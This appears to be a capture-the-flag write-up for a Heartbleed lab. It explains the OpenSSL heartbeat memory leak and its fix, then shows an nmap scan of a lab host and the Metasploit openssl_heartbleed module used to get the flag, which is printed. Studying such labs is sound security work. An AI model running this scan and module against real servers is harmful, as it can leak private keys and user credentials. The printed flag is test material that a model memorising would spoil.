# HeartBleed

# Introduction to Heartbleed and SSL/TLS

On the internet today, most web servers are configured to use SSL/TLS. SSL(secure socket layer) is a predecessor to TLS(transport layer security). The most common versions are TLS 1.2 and TLS 1.3(recently released). Configuring a web server to use TLS means that all communication from that particular server to a client will be encrypted; any malicious third party that has access to this traffic will not be able to understand/decrypt the traffic, and they also will not be able to modify the traffic. To learn more about how TLS connections are established, check 1.2 and 1.3 out.

Heartbleed is a bug due to the implementation in the OpenSSL library from version 1.0.1 to 1.0.1f(which is very widely used). It allows a user to access memory on the server(which they usually wouldn't have access to). This, in turn, allows a malicious user to access different kinds of information(that they wouldn't usually have access to due to the encryption and integrity provided by TLS), including:

- Server private key
- Confidential data like usernames, passwords, and other personal information

### Analyzing the Bug

The implementation error occurs in the heartbeat message that OpenSSL uses to keep a connection alive even when no data is sent. A mechanism like this is important because if a connection dies/resets quite often, it would be expensive to set up the TLS aspect of the connection again; this affects the latency across the internet, and it would make using services slow for users. A heartbeat message sent by one end of the connection contains random data and the data's length; this exact data is sent back when received by the other end of the connection. When the server retrieves this message from the client, here's what it does:

- The server constructs a pointer(memory location) to the heartbeat record
- It then copies the length of the data sent by a user into a variable(called payload)
    - The length of this data is unchecked
- The server then allocates memory in the form of:
- 1 + 2 + payload + padding(this can be maximum of 1 + 2 + 65535 + 16)
- The server then creates another pointer(bp) to access this memory
- The server then copies the payload number of bytes from data sent by the user to the bp pointer
- The server sends the data contained in the bp pointers to the user.

With this, you can see that the user controls the amount and length of data they send over. If the user does not send over any data(where the length is 0), it means that the server will copy arbitrary memory into the new pointer(which is how it can access secret information on the server). When retrieving data this way, the data can be different with different responses as the memory on the server will change.

### Remediation

To ensure that arbitrary data from the server isn't copied and sent to a user, the server needs to check the length of the heartbeat message:

- The server needs to check that the length of the heartbeat message sent by the user isn't 0
- The server needs to check the length doesn't exceed the specified length of the variable that holds the data

### References:

- [http://heartbleed.com/](http://heartbleed.com/)
- [https://www.seancassidy.me/diagnosis-of-the-openssl-heartbleed-bug.html](https://www.seancassidy.me/diagnosis-of-the-openssl-heartbleed-bug.html)
- [https://stackabuse.com/heartbleed-bug-explained/](https://stackabuse.com/heartbleed-bug-explained/)

# Enumeration / nmap scan

```jsx
$ nmap -T5 -sC -sV -Pn 10.65.79.44                                                                             10:06:37 [5/7]
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 10:06 EST                                                                
Nmap scan report for 10.65.79.44                                                                                               
Host is up (0.14s latency).                                                                                                    
Not shown: 997 closed tcp ports (reset)                                                                                        
PORT    STATE SERVICE  VERSION                                                                                                 
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 13:1b:fb:01:91:a0:aa:a8:10:5f:02:c8:79:2a:aa:84 (RSA)
|   256 f4:c6:82:97:59:c5:79:97:cd:0e:7a:2c:20:c4:cf:97 (ECDSA) 
|_  256 48:7a:ed:d2:7f:27:ed:1b:f3:c6:1f:b3:0e:9a:71:80 (ED25519)
	111/tcp open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36361/tcp6  status
|   100024  1          38731/tcp   status
|   100024  1          42584/udp   status
|_  100024  1          55868/udp6  status
443/tcp open  ssl/http nginx 1.15.7
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: What are you looking for?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=TryHackMe/stateOrProvinceName=London/countryName=UK
| Not valid before: 2019-02-16T10:41:14
|_Not valid after:  2020-02-16T10:41:14
|_http-server-header: nginx/1.15.7

```

I searched the metasploit for Hearbeat vuln and:

```jsx
msf > search HeartBleed                                                                                                        
                                                                                                                               
Matching Modules                                                                                                               
================                                                                                                               
                                                                                                                               
   #  Name                                                    Disclosure Date  Rank    Check  Description                      
   -  ----                                                    ---------------  ----    -----  -----------                      
   0  auxiliary/scanner/http/elasticsearch_memory_disclosure  2021-07-21       normal  Yes    Elasticsearch Memory Disclosure  
   1    \_ action: DUMP                                       .                .       .      Dump memory contents to loot     
   2    \_ action: SCAN                                       .                .       .      Check hosts for vulnerability
   3  auxiliary/server/openssl_heartbeat_client_memory        2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
	 4  auxiliary/scanner/ssl/openssl_heartbleed                2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak 

we use the 4th one HearBleed
Set verbose true
Set action scan
run and we bet the flag: THM{sSl-Is-BaD}
```